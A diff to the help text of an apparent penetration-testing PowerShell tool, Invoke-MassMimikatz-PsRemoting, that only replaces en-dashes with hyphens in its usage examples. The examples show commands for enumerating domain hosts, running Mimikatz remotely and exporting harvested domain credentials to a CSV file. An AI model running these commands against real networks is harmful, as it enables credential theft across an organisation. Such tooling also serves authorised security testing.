@@ -11,36 +11,36 @@
 	    .EXAMPLE
 	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 
-	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 
+	       PS C:\> Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 5 
 	       
 	    .EXAMPLE
 	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 	       Also, filter for systems with wmi enabled that are running Server 2012.
 
-	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm
+	       PS C:\> Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 5 -OsFilter “2012” -WinRm
 		       
 	    .EXAMPLE
 	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 	       Also, filter for systems with wmi enabled that are running Server 2012 and specify a file containing a list of systems.
 
-	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt
+	       PS C:\> Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 5 -OsFilter “2012” -WinRm -HostList c:\temp\hosts.txt
 
 	    .EXAMPLE
 	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 	       Also, filter for systems with wmi enabled that are running Server 2012. Also, include an additional target using hosts parameter.
 
-	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –Hosts “10.1.1.1”
+	       PS C:\> Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 5 -OsFilter “2012” -WinRm -Hosts “10.1.1.1”
 
 	    .EXAMPLE
 	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 	       Also, filter for systems with wmi enabled that are running Server 2012. Also, include an additional target using pipeline.
 
-	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm 
+	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 5 -OsFilter “2012” -WinRm 
 
  	    .EXAMPLE
 	       Run command from non-domain system using alternative credentials. Target 10.1.1.1.
 
-	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' | ft -AutoSize 
+	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting -Verbose -username domain\user1 -password 'MyPassword!' | ft -AutoSize 
 
 	            VERBOSE: Getting list of Servers from provided hosts...
 	            VERBOSE: Found 1 servers that met search criteria.
@@ -65,7 +65,7 @@
 	       Run command from non-domain system using alternative credentials. Target 10.1.1.1.
 	       Authenticate to the DC at 10.2.2.1 to determine if users are admins.
 
-	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget | ft -AutoSize
+	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting -Verbose -username domain\user1 -password 'MyPassword!' -DomainController 10.2.2.1 -AutoTarget | ft -AutoSize
 
 	            VERBOSE: Getting list of Servers from provided hosts...
 	            VERBOSE: Getting list of Servers from DC...
@@ -95,7 +95,7 @@
 	       Authenticate to the DC at 10.2.2.1 to determine if users are admins, and only pull passwords from one system.
 	       Then export to a file.
 
-	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1 | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
+	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting -Verbose -username domain\user1 -password 'MyPassword!' -DomainController 10.2.2.1 -AutoTarget -MaxHosts 1 | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
 
 	     .NOTES
 	       PSeudo Author/Code Gluer: Scott Sutherland (@_nullbind) - 2015, NetSPI
